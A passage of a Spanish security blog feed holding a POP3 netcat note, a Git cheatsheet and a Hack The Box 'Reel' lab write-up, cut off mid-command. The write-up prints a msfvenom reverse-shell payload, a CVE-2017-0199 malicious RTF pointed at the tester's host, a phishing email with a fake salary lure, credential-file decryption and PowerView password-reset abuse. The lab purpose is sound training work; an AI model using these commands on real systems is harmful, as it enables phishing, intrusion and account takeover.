+&lt;p&gt;Escrito el 28-12-2021 a las 07:42 pm por creep33.&lt;/p&gt;</content><author><name>creep33</name></author><category term="WriteUps" /><category term="HTB" /><summary type="html">WriteUp con metodología de la máquina Wall.</summary></entry><entry><title type="html">POP3</title><link href="http://localhost:4000/pop3/" rel="alternate" type="text/html" title="POP3" /><published>2021-12-17T00:00:00+01:00</published><updated>2021-12-17T00:00:00+01:00</updated><id>http://localhost:4000/pop3</id><content type="html" xml:base="http://localhost:4000/pop3/">&lt;h1 id=&quot;definición&quot;&gt;Definición&lt;/h1&gt;
+&lt;p&gt;El Post Office Protocol (POP) es un tipo de red informática y protocolo estándar de Internet que extrae y recupera el correo electrónico de un servidor de correo remoto para su acceso por la máquina host. POP es un protocolo de capa de aplicación en el modelo OSI que proporciona a los usuarios finales la capacidad de obtener y recibir correos electrónicos.&lt;/p&gt;
+
+&lt;p&gt;Por defecto opera en los puertos -&amp;gt; 110, 995&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;
+&lt;p&gt;Para utilizar este servicio podemos trabajar desde consola con &lt;strong&gt;netcat&lt;/strong&gt;. Para ello necesitamos poseer credenciales de acceso válidas.&lt;/p&gt;
+
+&lt;h2 id=&quot;autenticación&quot;&gt;Autenticación&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 10.10.10.10 110
+USER user
+PASS userpass
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;LIST -&amp;gt; Listar correos en la bandeja de entrada.&lt;/li&gt;
+  &lt;li&gt;RETR &amp;lt;int&amp;gt; -&amp;gt; Mostrar el correo numero &amp;lt;int&amp;gt; de la bandeja de entrada.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>creep33</name></author><category term="Service" /><category term="Windows" /><summary type="html">Con este servicio podremos listar correos recibidos, proporcionándole credenciales válidas.</summary></entry><entry><title type="html">GIT Cheatsheet</title><link href="http://localhost:4000/GIT/" rel="alternate" type="text/html" title="GIT Cheatsheet" /><published>2021-12-16T00:00:00+01:00</published><updated>2021-12-16T00:00:00+01:00</updated><id>http://localhost:4000/GIT</id><content type="html" xml:base="http://localhost:4000/GIT/">&lt;h1 id=&quot;definición&quot;&gt;Definición&lt;/h1&gt;
+&lt;p&gt;Git es un software de control de versiones diseñado por Linus Torvalds, pensando en la eficiencia, la confiabilidad y compatibilidad del mantenimiento de versiones de aplicaciones cuando estas tienen un gran número de archivos de código fuente.&lt;/p&gt;
+
+&lt;h1 id=&quot;setup&quot;&gt;SetUP&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.name &amp;lt;user&amp;gt;
+git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.email &amp;lt;email&amp;gt;
+git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; credential.helper store &lt;span class=&quot;c&quot;&gt;# Next time you provide credentials (username and token) them will be saved&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;uso&quot;&gt;Uso&lt;/h1&gt;
+
+&lt;h2 id=&quot;init&quot;&gt;INIT&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git init &lt;span class=&quot;c&quot;&gt;# Start a repo in the current directory&lt;/span&gt;
+git remote add origin &amp;lt;url&amp;gt; &lt;span class=&quot;c&quot;&gt;# Assing a url like a github url to push&lt;/span&gt;
+git remote set-url origin &amp;lt;url&amp;gt; &lt;span class=&quot;c&quot;&gt;# Change an existing repo to use ssh inted of https &lt;/span&gt;
+git push &lt;span class=&quot;nt&quot;&gt;--set-upstream&lt;/span&gt; origin main
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;commits&quot;&gt;Commits&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git add &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Add changes to a pre-commit place&lt;/span&gt;
+git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;comentarios&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Launch the changes as a new &quot;release&quot;&lt;/span&gt;
+git push &lt;span class=&quot;c&quot;&gt;# Upload the las commit to the url&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;clone&quot;&gt;Clone&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone &amp;lt;remote-repo-url&amp;gt; &lt;span class=&quot;c&quot;&gt;# Clone a repo&lt;/span&gt;
+git clone &lt;span class=&quot;nt&quot;&gt;--branch&lt;/span&gt; &amp;lt;branchname&amp;gt; &amp;lt;remote-repo-url&amp;gt; &lt;span class=&quot;c&quot;&gt;# Clone a branch from a repo&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;branches&quot;&gt;Branches&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git branch &lt;span class=&quot;c&quot;&gt;# List local branches&lt;/span&gt;
+git branch &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List remote branches&lt;/span&gt;
+git checkout &amp;lt;branch_name&amp;gt; &lt;span class=&quot;c&quot;&gt;# Move to a branch&lt;/span&gt;
+git branch &amp;lt;name&amp;gt; &lt;span class=&quot;c&quot;&gt;# Create a new branch&lt;/span&gt;
+git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &amp;lt;name&amp;gt; &lt;span class=&quot;c&quot;&gt;# Alt way to create a new branch&lt;/span&gt;
+git merge &amp;lt;name&amp;gt; &lt;span class=&quot;c&quot;&gt;# Merge the specified branch on the current one&lt;/span&gt;
+git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &amp;lt;name&amp;gt; &lt;span class=&quot;c&quot;&gt;# Remove a branch&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;merge&quot;&gt;Merge&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git merge &amp;lt;branch&amp;gt; &lt;span class=&quot;c&quot;&gt;# From the main branch (&amp;lt;branch&amp;gt; into main)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;diff&quot;&gt;Diff&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git diff &lt;span class=&quot;c&quot;&gt;# List changes after last commit and before git add .&lt;/span&gt;
+git diff &lt;span class=&quot;nt&quot;&gt;--staged&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# List changes after last commit and after last git add .&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;log&quot;&gt;LOG&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git log &lt;span class=&quot;c&quot;&gt;# Mostrar logs&lt;/span&gt;
+git show &amp;lt;SHA&amp;gt; &lt;span class=&quot;c&quot;&gt;# Muestra los cambios realizados en un log&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;restore&quot;&gt;Restore&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git restore &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Restaura los archivos desde el último commit o desde el último git add&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Escrito el 16-12-2021 a las 02:33 pm por creep33.&lt;/p&gt;</content><author><name>creep33</name></author><category term="Tools" /><category term="Generic" /><summary type="html">Algunos de los comandos más utilizados al usar GIT.</summary></entry><entry><title type="html">HTB-Reel</title><link href="http://localhost:4000/HTB-Reel/" rel="alternate" type="text/html" title="HTB-Reel" /><published>2021-12-16T00:00:00+01:00</published><updated>2021-12-16T00:00:00+01:00</updated><id>http://localhost:4000/HTB-Reel</id><content type="html" xml:base="http://localhost:4000/HTB-Reel/">&lt;center&gt;&lt;img src=&quot;/assets/images/WriteUps/Reel.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;IP -&amp;gt; 10.10.10.77&lt;/p&gt;
+
+&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;a href=&quot;/Nmap/&quot;&gt;nmap&lt;/a&gt; y obtenemos los siguientes resultados.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/files/WriteUps/Reel.txt&quot;&gt;Reel Nmap Result&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ftp&quot;&gt;ftp&lt;/h2&gt;
+&lt;p&gt;Tratamos de hacer una autenticación anonymous, y nos conecta. Listamos los directorios que hay.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;AppLocker.docx
+readme.txt
+Windows Event Forwarding.docx&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;os&quot;&gt;OS&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;readme.txt
+libreoffice AppLocker.docx
+libreoffice Windows Event Forwarding.docx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;En el readme vemos que tenemos que enviar un documento rtf (de texto enriquecido). 
+El archivo AppLocker.docx no tiene mucha cosa.
+El archivo “Windows Event Forwarding.docx” está corrupto y no podemos abrirlo.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;exiftool&quot;&gt;exiftool&lt;/h2&gt;
+&lt;p&gt;Vamos a listar los metadatos de los archivos con &lt;strong&gt;exiftool&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;MAIL: nico\@megaoffice.com&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;smtp&quot;&gt;smtp&lt;/h2&gt;
+&lt;h3 id=&quot;telnet&quot;&gt;telnet&lt;/h3&gt;
+&lt;p&gt;Nos conectamos con &lt;strong&gt;telnet&lt;/strong&gt; al servicio &lt;strong&gt;smtp&lt;/strong&gt;. Para validar el usuario encontrado.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet 10.10.10.77 25
+HELO a
+MAIL FROM: &amp;lt;creep33@megabank.com&amp;gt;
+RCPT TO: &amp;lt;nico@megabant.com&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;smpt-user-enum&quot;&gt;smpt-user-enum&lt;/h3&gt;
+&lt;p&gt;Tambien podemos utilizar herramientas alternativas para enumerar usuarios válidos, como por ejemplo &lt;strong&gt;smpt-user-enum&lt;/strong&gt;. El archivo &lt;em&gt;users&lt;/em&gt; tiene que tener los usuarios con el @.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smtp-user-enum &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; RCPT &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10.10.10.77
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;olevba&quot;&gt;olevba&lt;/h2&gt;
+&lt;p&gt;Podemos mirar si los archivos tienen macros con &lt;a href=&quot;/olevba/&quot;&gt;olevba&lt;/a&gt;, pero uno no tiene y el otro está corrupto&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;
+
+&lt;h2 id=&quot;smpt&quot;&gt;smpt&lt;/h2&gt;
+&lt;p&gt;Ahora vamos a intentar enviar un archivo RTF. Buscamos en google por “RTF malicius file remote command execution”. Encontramos un repositiorio con un script en python para crear el archivo RTF malicioso. Tenemos que tener un archivo .hta; Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -l formats&lt;/code&gt; podemos listar a ver si podemos crear un archivo .htb y vemos un tipo de archivo con nombre similar, creamos un payload de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/shell_reverse_tcp&lt;/code&gt; en formato &lt;strong&gt;.htb&lt;/strong&gt; para hostearlo con python y crear una reverse shell con netcat.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.10 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; hta-psh &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rev.hta
+python cve-2017-0199_toolkit.py &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; gen &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; salario.rtf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.14.10/rev.hta &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; RTF &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 0 
+
+sendemail &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; creep33@megabank.com &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nico@megabank.com &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMPORTANTE&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Este es el informe de tu salario del ultimo trimestre.&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.10.10.77 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; salario.rtf &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;user.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;user-pivoting&quot;&gt;User Pivoting&lt;/h1&gt;
+
+&lt;h2 id=&quot;os-1&quot;&gt;OS&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;cred.xml -&amp;gt; Archivo para almacenar un PSCredential, para almacenar credenciales, aunque podemos tratar de extraer la contraseña de la sesión.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Buscamos en google “powershell Import-Clixml”&lt;/p&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; = Import-Clixml -Path cred.xml; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.GetNetworkCredential() | Format-List *&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;User: Tom
+Pass: 1ts-mag1c!!!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;ssh&quot;&gt;ssh&lt;/h2&gt;
+&lt;p&gt;Nos conectamos por ssh con la credenciales obtenidas.&lt;/p&gt;
+
+&lt;h1 id=&quot;user-pivoting-2&quot;&gt;User Pivoting (2)&lt;/h1&gt;
+&lt;h2 id=&quot;os-2&quot;&gt;OS&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AD Audit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;note.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bloodhound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ingestors&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Vemos archivos como si hubieran hecho una auditoría.
+Y una nota que dice que no hay vías potenciales de escalar.
+acls.csv -&amp;gt; Archivo potencial a analizar, porque el resto son versiones de &lt;a href=&quot;/Bloodhound/&quot;&gt;SharpHound.ps1&lt;/a&gt; y es el único que destaca.
+Nos transferimos el archivo con &lt;a href=&quot;/smbserver.py/&quot;&gt;smbserver.py&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;libreoffice acls.csv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos un reporte de Bloodhound, con información del sistema. Seleccionamos todas las columnas que se usan y le damos a &lt;strong&gt;autofilter&lt;/strong&gt; para aplicar filtros. Buscamos el usuario tom, para ver que privilegios tiene. Vemos que tiene &lt;strong&gt;WriteOwner&lt;/strong&gt; sobre &lt;strong&gt;claire&lt;/strong&gt;, asi que podemos cambiarle la contraseña y conectarnos. Como esta el Powerview.ps1, nos aprovechamos para realizar la explotación&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación-1&quot;&gt;Explotación&lt;/h1&gt;
+
+&lt;h2 id=&quot;os-3&quot;&gt;OS&lt;/h2&gt;
+&lt;p&gt;Entramos en una powershell e importamos el &lt;strong&gt;Powerview.ps1&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Powerview.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-DomainObjectOwner&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;claire&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OwnerIdentity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tom&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-DomainObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TargetIdentity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;claire&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PrincipalIdentity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tom&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Rights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ResetPassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Mario123&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;!&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-DomainUserPassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;claire&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AccountPassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ssh-1&quot;&gt;ssh&lt;/h2&gt;
+&lt;p&gt;Nos conectamos por &lt;strong&gt;ssh&lt;/strong&gt; como claire con las credenciales setteadas.&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;PrivEsc&lt;/h1&gt;
+&lt;h2 id=&quot;os-4&quot;&gt;OS&lt;/h2&gt;
+
+&lt;p&gt;En el archivo acls.csv vemos que tenemos capacidad de añadirnos al grupo &lt;strong&gt;Backup_Admins&lt;/strong&gt; como el usuario &lt;strong&gt;claire&lt;/strong&gt; porque tenemos el privilegio &lt;strong&gt;WriteDacl&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Backup_Admins&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;claire&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para confirmar que el grupo se establece correctamente tenemos que salir y volver a entrar como el usuario claire.
+Miramos que permisos tenemos sobre el directorio &lt;em&gt;Administrator&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;root.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
